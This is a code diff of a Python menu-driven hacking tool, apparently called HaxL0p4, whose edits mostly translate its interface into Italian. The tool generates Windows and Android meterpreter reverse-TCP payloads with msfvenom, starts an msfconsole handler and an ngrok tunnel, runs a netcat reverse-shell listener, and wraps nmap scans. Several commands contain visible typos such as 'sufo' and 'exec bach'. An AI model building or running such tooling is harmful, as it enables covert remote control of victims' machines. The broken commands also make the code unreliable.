@@ -2,19 +2,24 @@
 
 import os
 import nmap
+#from scapy.all import * 
 import requests
 import json
 from colorama import Fore, Style
-#import argparse
+#from pymetasploit3.msfrpc import MsfRpcClient
+#from scapy.all import RandMAC, Dot11, Dot11Beacon, Dot11Elt, RadioTap
+import argparse
 from tkinter import *
 from tkinter import ttk
 from queue import Queue
-#from optparse import OptionParser
+from optparse import OptionParser
 import time, sys, socket, threading, logging, urllib.request, random
 import subprocess
 import time
 
-invalid_option = f"{Fore.RED} [💀] Invalid option... {Style.RESET_ALL}\n"
+
+
+opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida... {Style.RESET_ALL}\n"
 
 Remote_options = f"""
  ╔══════════════════════════════════╗
@@ -35,7 +40,7 @@ Network_options = f"""
  ╚══════════════════════════════════╝
 """
 
-modules = {
+moduli = {
 
     "windows": "windows/meterpreter/reverse_tcp",
     "android": "android/meterpreter_reverse_tcp",
@@ -44,18 +49,18 @@ modules = {
 
 }
 
-Modules_Payload = f"""
+Moduli_Payload = f"""
  ╔═════════════════════════════════════╗
- ║ [1] {Fore.CYAN}{modules['windows']}{Style.RESET_ALL} ║ 
- ║ [2] {Fore.CYAN}{modules['android']}{Style.RESET_ALL} ║
- ║ [3] {Fore.CYAN}{modules['custom']}{Style.RESET_ALL}                          ║
+ ║ [1] {Fore.CYAN}{moduli['windows']}{Style.RESET_ALL} ║ 
+ ║ [2] {Fore.CYAN}{moduli['android']}{Style.RESET_ALL} ║
+ ║ [3] {Fore.CYAN}{moduli['custom']}{Style.RESET_ALL}                          ║
  ╚═════════════════════════════════════╝
  ╔═════════════════════════════════════╗
- ║ [{Fore.RED}99{Style.RESET_ALL}]: {modules['exit']}                          ║
+ ║ [{Fore.RED}0{Style.RESET_ALL}]: {moduli['exit']}                           ║
  ╚═════════════════════════════════════╝
 """
 
-menu_options = f"""
+opzioni_menu = f"""
  ╔══════════════════════════════════╗
  ║ [1] Remote Access                ║ 
  ║ [2] Network                      ║
@@ -78,23 +83,26 @@ def haxlopa_gui():
     gui.config(bg="#1b1b1b")
     gui.resizable(False, False)
 
-    title = ttk.Label(text="HaxL0p4 GUI", font=("Arial", 30, "bold"), foreground="#fff", background="#1b1b1b")
-    title.pack(padx=10, pady=5)
+    titolo = ttk.Label(text="HaxL0p4 GUI", font=("Arial", 30, "bold"), foreground="#fff", background="#1b1b1b")
+    titolo.pack(padx=10, pady=5)
 
     gui.mainloop()
 
 # ================================================================== #
 
-def letter_animation(text, ms):
-    for letter in text:
-        print(letter, end='', flush=True)
+
+
+def animazione_lettere(testo, ms):
+    for lettera in testo:
+        print(lettera, end='', flush=True)
         time.sleep(ms)
+
 
 # ========================== #
 
 def ddos():
     os.system("clear && figlet L0p4 DDos")
-    print(f"{Fore.RED}\nComing soon{Style.RESET_ALL}")
+    print(f"{Fore.RED}\nProssimamente{Style.RESET_ALL}")
     while True:
         back = input("\nBack? Y/N: ")
 
@@ -105,44 +113,60 @@ def ddos():
 
 # ========================== #
 
-# Argument parser removed
-# ...
+parser = argparse.ArgumentParser(description="HaxL0p4 hacking tool")
+parser.add_argument('--gui', action="store_true", help="Start HaxL0p4 GUI")
+args = parser.parse_args()
 
-# Start Ngrok Server
+if args.gui:
+    haxlopa_gui()
+else:
+    pass
+
+
+
 def startNgrokServer():
     ngrokPORT = input("\n LOCAL PORT > ") 
 
     command = f"gnome-terminal --geometry=80x24+1000+70 -- bash -c 'sudo ngrok tcp {ngrokPORT}; exec bach'"
     subprocess.run(command, shell=True)
 
-def createPayload(module, LHOST, LPORT, NAME, FORMAT):
-    if module == 1:
+
+
+
+
+
+def createPayload(modulo, LHOST, LPORT, NAME, FORMAT):
+    if modulo == 1:
         print("\n")
         os.system(f"sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
-    elif module == 2:
+    elif modulo == 2:
         os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
-    else: ...
+    elif modulo == 3:
+        typeModule = input("\nMODULE > ")
+        os.system(f"sufo msfvenom -p {typeModule} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
 
-def custom_module(MODULE, LHOST, LPORT, FORMAT, NAME):
-    os.system("clear && Hax-Remote")
-    os.system(f"sufo msfvenom -p {MODULE} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
+
+
+
+
+
 
 def setPayload():
     os.system("clear && figlet HaxL0p4")
 
-    print(Modules_Payload)
+    print(Moduli_Payload)
     
     while True:
         choice = input(f"\n{Fore.CYAN} HaxL0p4/CreatePayload {Style.RESET_ALL}> ")
 
-        if choice not in ["1", "2", "3", "99"]:
+        if choice not in ["1", "2", "3", "0"]:
             os.system("clear && figlet HaxL0p4")
-            print(Modules_Payload)
-            invalid_option = f" {Fore.RED}[💀] Invalid option. Please enter 'Y' or 'N'.{Style.RESET_ALL}\n"
-            letter_animation(invalid_option, 0.03)
+            print(Moduli_Payload)
+            opzione_non_valida = f" {Fore.RED}[💀] Opzione non valida. Si prega di inserire 'Y' o 'N'.{Style.RESET_ALL}\n"
+            animazione_lettere(opzione_non_valida, 0.03)
             continue
 
-        if choice == "99":
+        if choice == "0":
             os.system("clear && figlet Hax-Remote")
             print(f"""
  ╔══════════════════════════════════╗
@@ -162,7 +186,7 @@ def setPayload():
         elif lanORwan.lower() == "n":
             pass
         else:
-            letter_animation(invalid_option, 0.03)
+            animazione_lettere(opzione_non_valida, 0.03)
 
         HOST = input(f"\n LHOST {Fore.CYAN}>{Style.RESET_ALL} ")
 
@@ -171,26 +195,27 @@ def setPayload():
                 LPORT = int(input(f" LPORT {Fore.CYAN}>{Style.RESET_ALL} "))
                 break
             except ValueError:
-                print(f"\n {Fore.RED} [!]Invalid format. Please enter an integer.{Style.RESET_ALL}")
+                print(f"\n {Fore.RED} [!]Formato non valido. Inserisci un numero intero.\n{Style.RESET_ALL}")
 
-        FORMAT = input(f"\n FORMAT (Ex: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
+        FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
         NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")
 
         if choice == "1":
-            createPayload(module=1, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+            createPayload(modulo=1, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
         elif choice == "2":
-            createPayload(module=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+            createPayload(modulo=2, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
         elif choice == "3":
-            module = input(f"{Fore.LIGHTBLUE_EX}MODULE{Style.RESET_ALL} > ")
-            custom_module(MODULE=module, LHOST=HOST, LPORT=LPORT, NAME=NAME, FORMAT=FORMAT)
+            module = input(f"\n Module {Fore.CYAN}> {Style.RESET_ALL}")
+            os.system(f"sudo msfvenom -p {module} LHOST={HOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
         elif choice == "99":
             break
         else:
-            letter_animation("\n"+invalid_option, 0.03)
+            animazione_lettere("\n"+opzione_non_valida, 0.03)
+
 
         os.system("clear && figlet HaxL0p4")
         
-        msf = input(f"\nStart {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
+        msf = input(f"\nAvviare {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
         if msf.lower() == "y":
             command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}, exploit; exploit; exec bash\"'"
             subprocess.run(command, shell=True)
@@ -198,7 +223,10 @@ def setPayload():
         elif msf.lower() == "n":
             return menu()
 
-# Netcat reverse shell listener
+
+
+
+# Ascoltatore netcat reverse shell
 
 def netcatListener():
     try:
@@ -209,8 +237,8 @@ def netcatListener():
                 port = int(input("\n PORT: "))
                 break
             except ValueError:
-                invalid_port = f"{Fore.RED}\n [💀] Invalid port...{Style.RESET_ALL}"
-                letter_animation(invalid_port, 0.03)
+                porta_non_valida = f"{Fore.RED}\n [💀] Porta non valida...{Style.RESET_ALL}"
+                animazione_lettere(porta_non_valida, 0.03)
                 return netcatListener()
 
         proxychains = input(" Use proxychains? Y/N: ")
@@ -230,28 +258,35 @@ def netcatListener():
                     elif exit.lower() == "n":
                         return
         else:
-            invalid_option = f"\n{Fore.RED} [💀] Invalid option... Please enter Y or N. {Style.RESET_ALL}"
-            letter_animation(invalid_option, 0.03)
-            os.system("clear && figlet HaxL0p4-NC")
+            opzione_non_valida = f"\n{Fore.RED} [💀] Opzione non valida... Inserire Y o N. {Style.RESET_ALL}"
+            animazione_lettere(opzione_non_valida, 0.03)
             return netcatListener()
         
     except KeyboardInterrupt:
         os.system("clear && figlet Hax-Remote")
         print(Remote_options)
 
+
+
 def arp_scan():
     os.system("clear && figlet Hax-Scan")
     os.system("\n\narp-scan -l")
 
-    back = input(f"{Fore.RED}\n\nBACK? Y/N: {Style.RESET_ALL}")
+    back = input(f"{Fore.RED}\n\n[❔] Back? Y/N: {Style.RESET_ALL}")
     if back.lower() == "y":
         network()
     else:
         pass
 
+
+
 def website_scanner():
     os.system("clear && figlet HaxL0p4")
+
     pass
+
+
+
 
 def ip_scanner():
     os.system("clear && figlet HaxL0p4")
@@ -272,7 +307,7 @@ def ip_scanner():
  ╚══════════════════════════════════╝               
  ╔═════════════════════════════════════╗
  ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
- ║ [{Fore.RED}99{Style.RESET_ALL}]: Menu                          ║
+ ║ [{Fore.RED}99{Style.RESET_ALL}]: Menù                          ║
  ╚═════════════════════════════════════╝
                  
  {Fore.CYAN}HaxL0p4/Network/Scanner/IpScanner/options{Style.RESET_ALL} > """)
@@ -280,9 +315,10 @@ def ip_scanner():
     if resp == "1":
         try:
             print(" \n Nmap Version: ", scanner.nmap_version())
-            letter_animation(f" {Fore.RED}[!] Scanning...{Style.RESET_ALL}\n\n ", 0.03)
+            animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
             scanner.scan(ip_addr, '1-1024', arguments="-v -sS")
             print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
+            #print(scanner[ip_addr].all_protocols())
             open_ports = scanner[ip_addr]['tcp'].keys()
             formatted_ports = ', '.join(map(str, open_ports))
             print(" Open Ports: ", formatted_ports)
@@ -291,7 +327,7 @@ def ip_scanner():
     elif resp == "2":
         try:
             print(" \n Nmap Version: ", scanner.nmap_version())
-            letter_animation(f" {Fore.RED}[!] Scanning...{Style.RESET_ALL}\n\n ", 0.03)
+            animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
             scanner.scan(ip_addr, '1-1024', arguments="-v -sU")
             print(f"udp: services: 1-1024\n Ip Status: {Fore.RED}up{Style.RESET_ALL}")
             print(scanner[ip_addr].all_protocols())
@@ -303,10 +339,11 @@ def ip_scanner():
     elif resp == "3":
         try:
             print(" \n Nmap Version: ", scanner.nmap_version())
-            letter_animation(f" {Fore.RED}[!] Scanning...{Style.RESET_ALL}\n\n ", 0.03)
+            animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
             scanner.scan(ip_addr, '1-1024', arguments="-v -sS -sC -A -O")
             print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
 
+            # Verifica se è stato rilevato il sistema operativo
             if 'osclass' in scanner[ip_addr]:
                 detected_os = scanner[ip_addr]['osclass'][0]['osfamily']
                 print(f"{Fore.LIGHTCYAN_EX} Operative System: {detected_os}{Style.RESET_ALL}")
@@ -324,7 +361,7 @@ def ip_scanner():
     elif resp == "99":
         return menu()
     elif resp >= '4':
-        letter_animation(invalid_option, 0.03)
+        animazione_lettere(opzione_non_valida, 0.03)
 
     loop = input("\n\n Repeat Scan? Y/N: ")
     while True:
@@ -333,10 +370,14 @@ def ip_scanner():
         elif loop.lower() == "n":
             return menu()
         else:
-            letter_animation(invalid_option, 0.03)
+            animazione_lettere(opzione_non_valida, 0.03)
+
+
 
 def ip_lookup():      
+
     os.system("clear && figlet HaxL0p4")
+
     ip = input(f"\n{Fore.CYAN}WEBSITE TARGET{Style.RESET_ALL} > ")
     print("\n")
     os.system(f" nslookup {ip}")
@@ -348,10 +389,14 @@ def ip_lookup():
         elif back.lower() == "n":
             network()
         else:
-            letter_animation(invalid_option, 0.03)
+            animazione_lettere(opzione_non_valida, 0.03)
+
+
+
 
 def scanner():
     os.system("clear && figlet HaxL0p4")
+    
     netScan_options = f"""
  ╔═════════════════════════════════════╗
  ║ [1] IP Scanner                      ║ 
@@ -361,7 +406,7 @@ def scanner():
 
  ╔═════════════════════════════════════╗
  ║ [{Fore.RED}0{Style.RESET_ALL}]: Back                           ║
- ║ [{Fore.RED}99{Style.RESET_ALL}]: Menu                          ║
+ ║ [{Fore.RED}99{Style.RESET_ALL}]: Menù                          ║
  ╚═════════════════════════════════════╝
 """
     print(netScan_options)
@@ -371,7 +416,8 @@ def scanner():
         if s == "1":
             ip_scanner()
         elif s == "2":
-            letter_animation("\n"+" Coming Soon...", 0.03)
+            #website_scanner()
+            animazione_lettere("\n"+opzione_non_valida, 0.03)
             scanner()
         elif s == "3":
             ip_lookup()
@@ -380,13 +426,15 @@ def scanner():
         elif s == "99":
             return menu()
         else: 
-            letter_animation("\n"+invalid_option, 0.03)
+            animazione_lettere("\n"+opzione_non_valida, 0.03)
             return scanner()
+
 
 def network():
     os.system("clear && figlet Hax-Net")
     print(Network_options)
     choice = input(f"\n{Fore.CYAN} HaxL0p4/network{Style.RESET_ALL} > ")
+
 
     while True:
         if choice == "1":
@@ -398,15 +446,19 @@ def network():
         else:
             os.system("clear && figlet Hax-Net")
             print(Network_options)
-            invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
-            letter_animation(invalid_option, 0.03)
+            opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida...{Style.RESET_ALL}"
+            animazione_lettere(opzione_non_valida, 0.03)
             return network()
 
+
 def track_location(): ...
+
 
 def get_public_ip():
     response = requests.get("https://api.ipify.org")
     return response.text
+
+
 
 def ipGeolocation():
     while True:
@@ -437,85 +489,95 @@ def ipGeolocation():
         print(f"IPv4 Address: {result['IPv4']}")
         print(f"State: {result['state']}")
 
-        back = input("\nBack Y/N: ")
+        back = input(f"\n{Fore.RED}[❔] Back Y/N: {Style.RESET_ALL}")
 
         if back.lower() == "y":
             return
         elif back.lower() == "n":
             pass
         else:
-            print("Invalid option...")
+            print("Opzione non valida...")
+
+
+
 
 def RemoteAccess() :
-    os.system("clear && figlet Hax-Remote")
-
-    while True:
+    try:
+        os.system("clear && figlet Hax-Remote ")
         print(Remote_options)
-        choice = input(f"\n{Fore.CYAN} HaxL0p4/RemoteAccess {Style.RESET_ALL}> ")
 
-        if choice == "1":
-            setPayload()
-        elif choice == "2":
-            netcatListener()
-        elif choice == "0":
-            menu()
-        else:
-            os.system("clear && figlet Hax-Remote")
-            print(Remote_options)
-            invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
-            letter_animation(invalid_option, 0.03)
+        while True:   
+            choice = input(f"\n{Fore.CYAN} HaxL0p4/RemoteAccess{Style.RESET_ALL} > ")    
+            if choice == "1" :
+                setPayload()
+            elif choice == "2" :
+                netcatListener()
+            elif choice == "0":
+                return
+            elif choice == "back":
+                return
+            else: 
+                os.system("clear && figlet Hax-Remote")
+                print(Remote_options)
+                animazione_lettere(opzione_non_valida, 0.03)
+    except KeyboardInterrupt:
+
+        while True:
+            exit = input(f"\n{Fore.RED} \n [{Style.RESET_ALL}*{Fore.RED}]{Style.RESET_ALL}{Fore.LIGHTCYAN_EX} Chiudere il programma? Y/N: {Style.RESET_ALL}")
+            if exit.lower() == "y":
+                chiusura = f"{Fore.GREEN}\n [🐱]{Style.RESET_ALL} {Fore.RED}È stato un piacere :)... {Style.RESET_ALL}"
+                animazione_lettere(chiusura, 0.03)
+                break
+            elif exit.lower() == "n":
+                return RemoteAccess()
+            else:
+                animazione_lettere(opzione_non_valida, 0.03)
+
+
 
 def menu():
-    os.system("clear && figlet Hax-Menu")
-
-    while True:
-        print(menu_options)
-        choice = input(f"\n{Fore.CYAN} HaxL0p4 {Style.RESET_ALL}> ")
-
-        if choice == "1":
-            RemoteAccess()
-        elif choice == "2":
-            network()
-        elif choice == "3":
-            track_location()
-        elif choice == "4":
-            ddos()
-        elif choice == "5":
-            ipGeolocation()
-        elif choice == "6":
-            update()
-        elif choice == "0":
-            sys.exit()
-        else:
+    try:
+        while True:
             os.system("clear && figlet HaxL0p4")
-            print(menu_options)
-            invalid_option = f"{Fore.RED} [💀] Invalid option...{Style.RESET_ALL}"
-            letter_animation(invalid_option, 0.03)
+            prossimamente = f" \n{Fore.RED} Ancora non disponibile...{Style.RESET_ALL}"
 
-def update():
-    os.system("clear && figlet HaxL0p4")
-    os.system("git stash && git pull")
-   # update_msg = f"""
-  #  {Fore.LIGHTCYAN_EX}
-  #  [💡] Please download the new version.
-  #  [💡] Link: https://github.com/L0PA/HaxL0p4
-  #  {Style.RESET_ALL}
-  #  """
-  #  print(update_msg)
-    while True:
-        back = input(f"\n{Fore.RED}Back? Y/N: {Style.RESET_ALL}")
+            print(opzioni_menu)
 
-        if back.lower() == "y":
-            menu()
-        elif back.lower() == "n":
-            pass
-        else:
-            print(f"\n{Fore.RED}[💀] Invalid option...{Style.RESET_ALL}")
+            s = input(f"{Fore.CYAN} \n HaxL0p4{Style.RESET_ALL} > ")
 
-def main():
-    os.system("clear && figlet HaxL0p4")
-    #letter_animation(" [💡] Loading...", 0.03)
-    menu()
+            if s == "1":
+                RemoteAccess()
+            elif s == "2":
+                network()
+            elif s == "3":
+                animazione_lettere(prossimamente, 0.03)
+                return menu()
+                #track_location()
+            elif s == "4":
+                while True:
+                    animazione_lettere(prossimamente, 0.03)
+                    return menu()
+                    #ddos()
+            elif s == "5":
+                ipGeolocation()
+            elif s == "6":
+                os.system("git stash && git pull")
+                return menu()
+            elif s == "0":
+                break
+            else: 
+                animazione_lettere("\n"+opzione_non_valida, 0.03)
+                return menu()
+    except KeyboardInterrupt:
+        while True:
+            exit = input(f"\n{Fore.RED} \n[{Style.RESET_ALL}*{Fore.RED}]{Style.RESET_ALL}{Fore.LIGHTCYAN_EX}Chiudere il programma? Y/N: {Style.RESET_ALL}")
+            if exit.lower() == "y":
+                chiusura = f"{Fore.GREEN}\n[🐱]{Style.RESET_ALL} {Fore.RED}È stato un piacere :)... {Style.RESET_ALL}"
+                animazione_lettere(chiusura, 0.03)
+                break
+            elif exit.lower() == "n":
+                return menu()
+            else:
+                animazione_lettere(opzione_non_valida, 0.03)
 
-if __name__ == "__main__":
-    main()
+menu()
